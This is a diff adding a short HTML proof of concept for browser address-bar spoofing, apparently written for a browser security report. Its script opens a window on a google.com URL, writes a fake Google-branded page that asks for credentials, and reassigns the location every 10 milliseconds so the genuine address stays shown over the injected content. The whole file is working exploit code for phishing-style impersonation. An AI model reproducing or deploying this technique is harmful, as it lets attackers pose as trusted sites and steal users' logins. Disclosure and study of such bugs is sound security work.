@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="spoof()">Click to spooffff</button>
+<script>
+function spoof() {
+let win = window.open("https://www.google.com:8000");
+let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
+'<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
+'<h1>This is NOT Google!</h1>' +
+'<p>Please enter your credentials:</p>' +
+'</div>';
+win.document.write(payload);
+win.document.close();
+setInterval(function() {
+win.location.assign("https://www.google.com:8000");
+}, 10); // Small interval to preserve the spoof
+}
+</script>
+</body>
+</html>
